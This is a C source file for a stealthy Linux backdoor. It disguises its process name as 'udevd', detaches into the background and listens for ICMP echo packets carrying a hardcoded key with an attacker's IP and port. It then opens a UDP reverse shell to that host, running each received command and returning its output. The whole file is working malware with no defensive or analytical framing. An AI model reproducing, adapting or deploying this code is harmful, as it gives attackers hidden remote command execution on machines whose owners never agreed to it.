/*
 * reverse_udp.c
 *
 *  Created on: 2017年3月2日
 *  Base On Multiple project from GIT
 *  Thanks a lot!
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <stdbool.h>

/* struct for thread parameter */
typedef struct {
	struct sockaddr_in addr;
	int udp_socket;
	int peer_port;
} NET_INFO;

void thread_cmd_system(void * param);
int icmp_listen(char resver_ip[16], int *port);
int fake_icmp_listen(char resver_ip[16], int *port);

int main(int argc, char **argv) {
	const char FAKE_PROCESS_NAME[] = "udevd";
	NET_INFO st_netinfo;
	pthread_t thread_id = 0;
	char revers_ip[16];
	strcpy(argv[0], FAKE_PROCESS_NAME);

	if(fork()>0)
		exit(0);
	while (icmp_listen(revers_ip, &st_netinfo.peer_port) == 1) {

		if ((st_netinfo.udp_socket = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
			printf("Socket Init Error\n");
			return EXIT_FAILURE;
		}

		st_netinfo.addr.sin_family = AF_INET;
		st_netinfo.addr.sin_port = htons(st_netinfo.peer_port);
		st_netinfo.addr.sin_addr.s_addr = inet_addr(revers_ip);

		// prevent too much active command create too much thread
		if (thread_id)
			pthread_cancel(thread_id);

		pthread_create(&thread_id, NULL, (void *)thread_cmd_system,
				(void*) &st_netinfo);
		sleep(5);
	}
	return EXIT_SUCCESS;
}

void thread_cmd_system(void * param) {
	const int MAXLINE = 100;
	const char BANNER[] = "Welcome :-) \nUse 'quit' command close connections\n";

	char result_buf[4096];
	char cmd[512];
	int limit;
	ssize_t ret_bytes;
	socklen_t len;
	FILE *fpRead;
	NET_INFO * nf = (NET_INFO *) param;

	/* Send Banner to controller */
	sendto(nf->udp_socket, BANNER, strlen(BANNER), 0,
			(struct sockaddr *) &nf->addr, sizeof(nf->addr));

	while (true) {
		pthread_testcancel();
		len = sizeof(nf->addr);
		bzero(cmd, sizeof(cmd));
		ret_bytes = recvfrom(nf->udp_socket, cmd, sizeof(cmd), 0,
				(struct sockaddr*) &(nf->addr), &len);
		/* special process quit command */
		if (strstr(cmd, "quit") == cmd) {
			strcpy(result_buf, "SEE YOU NEXT TIME!\n");
			sendto(nf->udp_socket, result_buf, strlen(result_buf), 0,
					(struct sockaddr *) &nf->addr, sizeof(nf->addr));
			close(nf->udp_socket);
			break;
		}

		limit = 0;
		if (ret_bytes > 0) {
			fpRead = popen(cmd, "r");
			if (fpRead != NULL) {
				bzero(result_buf, sizeof(result_buf));
				while (fgets(result_buf, sizeof(result_buf) - 1, fpRead) != NULL) {
					sendto(nf->udp_socket, result_buf, strlen(result_buf), 0,
							(struct sockaddr *) &nf->addr, sizeof(nf->addr));
					bzero(result_buf, sizeof(result_buf));
					if (++limit > MAXLINE) {
						sprintf(result_buf,
								"I CAN SHOW YOU NO MORE THAN %d LINES!\n",
								MAXLINE);
						sendto(nf->udp_socket, result_buf, strlen(result_buf),
								0, (struct sockaddr *) &nf->addr,
								sizeof(nf->addr));
						break;
					}
				}
				pclose(fpRead);
			}
		}
	}
}

int icmp_listen(char resver_ip[16], int *port) {
	const int ICMP_PACKET_SIZE = 1024;
	const char ICMP_KEY[] = "p4ssw0rd";

	int sockfd, n, icmp_key_size;
	char buf[ICMP_PACKET_SIZE + 1];
	struct icmp *icmp;
	struct ip *ip;

	icmp_key_size = strlen(ICMP_KEY);
	sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

	bzero(buf, ICMP_PACKET_SIZE + 1);
	n = recv(sockfd, buf, ICMP_PACKET_SIZE, 0);
	if (n > 0) {
		ip = (struct ip *) buf;
		icmp = (struct icmp *) (ip + 1);
		/* If this is an ICMP_ECHO packet and if the KEY is correct */
		if ((icmp->icmp_type == ICMP_ECHO)
				&& (memcmp(icmp->icmp_data, ICMP_KEY, icmp_key_size) == 0)) {
			bzero(ip, sizeof(struct ip));
			sscanf((char *) (icmp->icmp_data + icmp_key_size + 1), "%15s %d",
					resver_ip, port);
			if ((*port <= 0) || (strlen(resver_ip) < 7))
				return 0;
			return 1;
		}
	}
	return 0;
}

int fake_icmp_listen(char resver_ip[16], int *port) {
	// only for test
	strcpy(resver_ip, "192.168.99.115");
	*port = 5000;
	return 1;
}
